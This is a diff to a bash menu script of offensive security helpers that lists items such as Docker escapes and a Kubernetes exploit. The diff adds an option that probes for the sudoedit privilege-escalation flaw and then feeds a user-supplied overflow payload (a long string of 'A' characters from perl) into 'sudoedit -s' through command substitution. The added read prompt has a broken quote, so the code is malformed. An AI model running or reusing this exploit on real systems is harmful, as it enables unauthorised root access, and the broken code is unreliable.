@@ -114,6 +114,7 @@ while true; do
 	echo -ne " 168. search keywords inside files in specific folder\t\t\t\t\t169. dump keys from memcached\n"
 	echo -ne " 171. escape from Docker method 1\t\t\t174. extract a tar.gz file\n"
 	echo -ne " 177. use Kubernetes exploit for Local Command Execution\t\t\t\t178. analyze an executable file with strace and ltrace\n"
+	echo -ne " 182. PrivEsc with sudoedit\n"
 	echo "WINRM"
 	echo -ne " 132. Alamot/code-snippets/winrm/\n"
 	echo "OTHERS"
@@ -756,6 +757,16 @@ while true; do
 	"181")
 		Scarica "dylanaraps/neofetch" "$ENTRAW""dylanaraps/neofetch/master/neofetch" "neofetch"
 		Scarica "dylanaraps/neofetch/neofetch.1" "$ENTRAW""dylanaraps/neofetch/master/neofetch.1" "neofetch.1"
+	;;
+	"182")
+		echo "testing sudoedit vulnerability..."
+		sudoedit -s /
+		echo "Digit a command with arguments"
+		read -p (example, perl -e 'print "A" x 65536'): " CMD
+		if [[ "$CMD" != "" ]];
+		then
+			sudoedit -s '\' `$CMD` 
+		fi
 	;;
 	*)
 		echo "error, invalid choice"
